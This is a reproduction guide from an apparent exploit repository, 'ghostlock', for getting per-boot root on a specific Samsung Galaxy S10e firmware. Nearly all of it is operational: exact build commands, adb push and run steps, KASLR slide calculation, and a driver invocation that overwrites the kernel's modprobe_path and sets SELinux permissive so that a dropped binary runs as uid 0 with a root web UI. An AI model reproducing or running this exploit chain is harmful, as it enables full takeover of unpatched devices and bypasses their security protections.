# REPRODUCE.md — build and run ghostlock on SM-G970W

This is the end-to-end, from-source path. It assumes the exact target; the
exploit is **firmware-locked** by its symbol/struct offsets.

## 0. Target and host

| | |
|---|---|
| Model / market code | **SM-G970W** (Galaxy S10e, SD855) |
| Device / board code | **`beyond0q`** (`ro.product.device`); product `beyond0qltecs` |
| Android | 12 (SDK 31) |
| ROM build code | **`G970WVLU9IXE1`** (display id `SP1A.210812.016.G970WVLU9IXE1`) |
| Fingerprint | `samsung/beyond0qltecs/beyond0q:12/SP1A.210812.016/G970WVLU9IXE1:user/release-keys` |
| Kernel | **`4.14.190-23725627-abG970WVLU9IXE1`** |
| Security patch | 2023-03-01 |
| Build type | `user` / `ro.debuggable=0` |
| CSC | `XAC` |
| Boot state | `verifiedbootstate=green`, `flash.locked=1`, `sys.oem_unlock_allowed=0` (bootloader **locked** is fine) |
| Result | a **transient, per-boot** uid-0 userspace root (no flash, no `/system`, no persistence) |

Verify your unit before building:

```
adb shell 'getprop ro.product.device ro.build.display.id ro.build.version.security_patch; uname -r'
```

Build host: **WSL/Ubuntu** (or any arm64 Linux) with `aarch64-linux-gnu-gcc`,
`python3`, `xxd`, `file`. Plus `adb` (platform-tools) on the Windows side.

## 1. Build everything

```
bash tools/build14.sh /tmp/glXX
```

Produces (and copies back to the repo root as `<base>_*`):

| artifact | what it is |
|---|---|
| `<base>_a64` | the **driver** (main exploit binary) |
| `<base>_dnroot_a64` | the UMH payload the kernel execs as root (legacy path) |
| `<base>_mpnl_a64` | the **root daemon**: file channel + localhost HTTP **web UI** |
| `<base>_slideprobe_a64` | KASLR **slide probe** (perf IP sampler, read-only) |
| `<base>_mphelper_a64` | legacy file-channel root helper (`rcmd` -> `rout`) |
| `<base>_getid_a64` | tiny uid/euid probe |
| `<base>_trigger_a64` | standalone futex PI reachability probe |
| `<base>_rsd_a64` | diagnostic runner for the root-shell daemon |
| `<base>_pwn2` | the 4x0xFF file whose exec triggers `request_module()` |

## 2. Offsets and KASLR — the part that bites

`src/devices/beyond0q/offsets.h` and the defaults in `src/core/target.h` are
**per-firmware** values (symbol offsets + `struct` field offsets). They were
derived from a **matched kernel image + symbol table** and are the reason the
exploit only works on the pinned build above:

* symbol offsets (`off_*`): from the matched kernel's `kallsyms` (a `vmlinux`
  with symbols, or `/proc/kallsyms` on a root/eng unit of the same build);
* `struct` field offsets (`task_*`, `waiter_*`, `fops_*`): `offsetof()`
  against the matching kernel **source** (compile a tiny probe module, cf. the
  `build_probe.sh` pattern used during development);
* `kernel_phys_load`: read "Kernel code" from `/proc/iomem` on a rooted unit
  (or leave `0` to use the `target.h` fallback).

Those external inputs (`vmlinux.elf`, `kallsyms_fixed.txt`, the full ROM
source) are **not** in this repo. On a different firmware you must re-derive
them — otherwise every kernel write lands in unrelated RAM (no crash, no
effect, very hard to debug).

The runtime **KASLR slide** is separate and must be found each boot — see §3.
`slideprobe` samples kernel IPs with perf and prints them by frequency; match
the dominant IP against the pinned symbols to get the base. The driver can also
leak it itself (below).

## 3. Run — one adb command per step

Full procedure is in `docs/DEBUG_WORKFLOW.md` and `docs/RUN_CONFIG.md`; the
working config is:

```
adb push glXX_a64     /data/local/tmp/glXX
adb push glXX_mpnl_a64 /data/local/tmp/mpnl
adb push glXX_pwn2    /data/local/tmp/pwn2
adb shell "chmod 755 /data/local/tmp/glXX /data/local/tmp/mpnl /data/local/tmp/pwn2"
```

1. **Slide** (per boot): `timeout 70 /data/local/tmp/slideprobe` -> take the
   line ending `...bd4`; `SLIDE = low32(IP) - 0x08000000 - 0x3bd4`.
   *(Or skip it: the driver leaks the slide itself — see below.)*
2. **Warm** the fscrypt channel files (a kernel-spawned process cannot create
   new `/data` files): `cat /data/local/tmp/mpnl >/dev/null; : > rcmd; : > rout;
   : > mp_ran; cat rcmd rout mp_ran >/dev/null`.
3. **Driver** (writes `modprobe_path`, marks the kernel domain permissive):
   ```
   adb shell "env SSOPT_EMPTY=1 SSOPT_FAKE_TASK=1 SSOPT_OWNER0=0 \
     PSELECT_ROUTE_DELAY_USEC=0 ROUTE_SETSOCKOPT=1 FORCE_REDIRECT=1 \
     SLIDE=0x<slide> MP_PATH=/data/local/tmp/mpnl \
     timeout 150 /data/local/tmp/glXX --stop-after=verify --log=info"
   ```
   (Without `SLIDE=`, the driver calls `slide_leak_kernel_base()` itself.)
4. **Trigger**: `adb shell "/data/local/tmp/pwn2"` -> the kernel runs `mpnl` as
   uid 0.
5. **Verify**: `cat /data/local/tmp/mp_ran` shows `mpnl uid=0 ...`, and the UI
   answers on `127.0.0.1:8080`.

`scripts/arm_root.sh` wraps steps 1-4; `scripts/ui_selftest.sh` checks step 5.

## 4. Root UI

Open **`http://127.0.0.1:8080/`** in Chrome **on the device** — drive root
commands, `setprop` and `cmd`-based tweaks. See `docs/ROOT_UI.md`.

## 5. Troubleshooting

* **One adb command per step** on the device — a panic is then attributable, and
  the watchdog reboots in seconds.
* **Wedge** (adb drops): `adb reboot` or wait for the watchdog; then
  `adb wait-for-device`, re-check `boot_id`, re-probe the slide.
* **Never** use `--log=debug` for normal runs (the added `pr_info+fsync` widens
  the clobber window and wedges).
* Do **not** delete `rout`/`mp_ran`/`rcmd` (fscrypt ENOKEY): recreate by
  truncating a pre-existing file, not by `rm`.

## 6. Scope / limitations (by design)

Per-boot only; unlocked flash, `/system` writes, unsigned modules, and reboot
persistence are all out of reach (`docs/KSU_ROOT_FINDINGS.md`, §10-13).

## 7. Not in this repo

The exploit here is complete, but reproduction also needs, from outside:
the pinned **kernel image + `kallsyms`** (offset derivation), the **full ROM
source** (struct offsets), and the device's **property dumps** used for the VoLTE
notes. Those stay local. The development scratch scripts
(`tools/scripts/*.sh|py` and one-off `patch_*` helpers) are also local; the
*reproducible* tool sources live under `src/tools/`, `src/primitives/` and are
built by `tools/build14.sh`.
